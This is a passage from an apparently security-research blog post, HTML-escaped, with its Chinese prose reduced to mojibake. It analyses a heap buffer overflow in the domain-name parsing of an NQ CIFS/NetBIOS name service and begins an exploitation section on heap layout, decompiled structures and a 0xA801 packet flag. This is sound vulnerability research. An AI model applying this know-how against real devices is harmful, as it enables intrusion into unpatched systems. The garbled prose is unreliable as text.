      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;595&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¾é€™å€‹å‡½å¼ä¸­ï¼Œå¯ä»¥çœ‹å‡ºä»–åœ¨è™•ç† domain name æ™‚ï¼Œæœ‰æŒ‰ç…§æ‰€æä¾›çš„åƒæ•¸ä¾†æª¢æŸ¥é•·åº¦ï¼Œä¸¦ä¸”æœƒåœ¨æ¯å€‹ label é–“åŠ å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;ï¼Œç„¶è€Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; çš„éƒ¨åˆ†ä¸¦æ²’æœ‰å»æª¢æŸ¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; é€™å€‹å­—å…ƒçš„é•·åº¦ï¼Œå¯¦éš›ä¸Šçš„é•·åº¦å¯ä»¥æ¯”åŸæœ¬çš„ buffer é‚„è¦é•·ï¼Œå°è‡´ buffer overflowã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;åŸæœ¬ä»¥ç‚ºæœƒéœ€è¦æ›´è©³ç´°å»é€†å‘ Heap internalï¼Œä¸éå¹¸é‹çš„æ˜¯ï¼Œå¾Œä¾†ç™¼ç¾åˆ° buffer å¾Œé¢æœ‰å¥½ç”¨çš„çµæ§‹å¯ä»¥åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt; å¾Œï¼Œå­˜åœ¨ä¸€å€‹çµæ§‹ï¼Œé€™é‚Šå…ˆå‘½åç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The layout of heap memory:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; :&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è©²çµæ§‹ä¸»è¦ç”¨ä¾†å„²å­˜ NetBIOS çš„åç¨±è³‡è¨Šï¼Œè€Œå…¶ä¸­ä¹ŸåŒ…å«å¦å¤–ä¸€å€‹çµæ§‹ï¼Œé€™è£¡å‘½åç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;ï¼Œä¸»è¦å„²å­˜è©² NetBIOS çš„é€£ç·šè³‡è¨Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; :&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Adapter&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1023&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword3C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨åˆæ­¥äº†è§£é€™äº›çµæ§‹ä¹‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥å…ˆå›é ­çœ‹ä¸€ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;ï¼Œå¦‚æœå°‡å°åŒ…ä¸­çš„ flag æ¬„ä½è¨­æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xA801&lt;/code&gt;ï¼Œå°‡æœƒä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; å»è™•ç† NetBIOS name. è©²çµæœå°‡æœƒå¯«å…¥&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter-&amp;gt;responsebuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨ ndInternalNameNegativeRegistration ä¸­:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åªè¦æ»¿è¶³æ¢ä»¶å°±æœƒå» returnNegativeRegistrationResponse è™•ç† Responseï¼Œè€Œåœ¨ returnNegativeRegistrationResponse ä¸­:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-2Ch] BYREF&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+1Ah] [bp-16h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;maybe_memcpy_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2349&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_40B06FD8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responsebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndGenerateNameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sySendToSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
